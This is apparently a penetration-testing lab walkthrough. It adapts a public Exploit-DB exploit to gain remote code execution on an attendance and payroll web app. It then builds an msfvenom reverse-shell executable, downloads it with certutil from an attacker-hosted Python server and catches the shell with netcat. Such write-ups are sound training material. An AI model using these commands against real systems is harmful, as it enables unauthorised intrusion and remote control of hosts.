**Let me check is there any public exploit for the attendance and payroll site on Port 81:**

**Searching for public exploit:** 
![[Pasted image 20240602132338.png]]
So we have two exploits, will try first one.
Here is the link for first exploit:[[https://www.exploit-db.com/exploits/50801]] 

**Initially I ran the code but it doesn't work:**
![[Pasted image 20240602132705.png]]

**So inspected the code again i and found the Problem:**
![[Pasted image 20240602132843.png]]
This is the problematic area, where the url points **/apsystem/admin/employee_edit_photo.php**
Because we don't see the **"appsystem"** in the directory traversal enumeration as well.

**I have checked that the path is valid or not by entering "appsystem" in the url:** 404 Not found is the result.
![[Pasted image 20240602133144.png]]

**But /admin works:**
![[Pasted image 20240602133240.png]]

**Hence we need to remove appsystem from the code and proceed:****
![[Pasted image 20240602133407.png]]

Now the exploit work..! we can do RCE now
![[Pasted image 20240602133446.png]]

Now we have a shell, kindaaa...
We need a Proper shell to enumerate further, will download the reverse shell payload using the RCE, For that will host a python web server as alwayzzzzz.
```
python3 -m http.server 80
```
![[Pasted image 20240602134100.png]]

**Now will generate a payload for a windows system using MSFVENOM:**

```
msfvenom -p windows/x64/shell_reverse_tcp  192.168.45.177 LPORT=443 -f exe -o met.exe
```

![[Pasted image 20240602134240.png]]

**Its ready now... letzzz transfer this to the windows system using Certutil funtion:**
Run the following command in the RCE shell
```
certutil -urlcache -f http://192.168.45.177/met.exe c:/windows/temp/met.exe
```

![[Pasted image 20240602134644.png]]
![[Pasted image 20240602134705.png]]

**Now we have to trigger that payload before that wee need to setup out Netcat listener on our kali machine**
```
rlwrap nc -nvlp 443
```

**To trigger the payload will you the following command in the RCE shell:**
```
C:\windows\temp\met.exe
```

![[Pasted image 20240602135139.png]]

![[Pasted image 20240602135210.png]]
Got it......! We are in a proper interactive shell.

Ok Now will go to Lateral Movement